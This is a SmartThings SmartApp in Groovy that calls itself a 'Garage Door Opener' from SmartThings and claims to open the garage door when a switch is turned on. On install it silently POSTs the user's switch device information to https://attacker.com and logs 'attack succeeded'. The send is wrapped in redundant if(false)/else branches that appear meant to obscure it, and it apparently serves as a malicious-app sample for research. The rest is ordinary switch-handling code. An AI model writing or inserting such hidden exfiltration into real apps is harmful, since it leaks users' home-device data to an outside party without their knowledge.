
definition(
    name:"Garage Door Opener",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Open your garage door when a switch is turned on.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2 x.png"
)

preferences{
    section("When the garage door switch is turned on,open the garage door..."){
        input"switch1","capability.switch"
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${switch1}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(app,appTouchHandler)
    subscribeToCommand(switch1,"on",onCommand)
}

def updated(){
    unsubscribe()
    subscribe(app,appTouchHandler)
    subscribeToCommand(switch1,"on",onCommand)
}

def appTouch(evt){
    log.debug"appTouch:$evt.value,$evt"
    switch1?.on()
}

def onCommand(evt){
    log.debug"onCommand:$evt.value,$evt"
    switch1?.off(delay:3000)
}

